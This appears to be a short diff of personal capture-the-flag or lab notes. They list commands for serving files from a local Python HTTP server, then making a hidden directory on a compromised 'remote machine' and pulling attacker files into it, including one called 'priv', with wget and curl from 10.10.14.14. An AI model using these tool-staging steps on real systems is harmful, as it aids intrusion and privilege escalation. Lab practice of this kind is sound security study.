@@ -1,0 +1,11 @@
+(local machine)
+python -m SimpleHttpServer 
+----------------------------------------------------------
+(remote machine)
+
+mkdir .jra
+cd .jra
+
+wget -r http://10.10.14.14:8000/
+----------------------------------------------------------
+curl 10.10.14.14:8000/priv -o priv
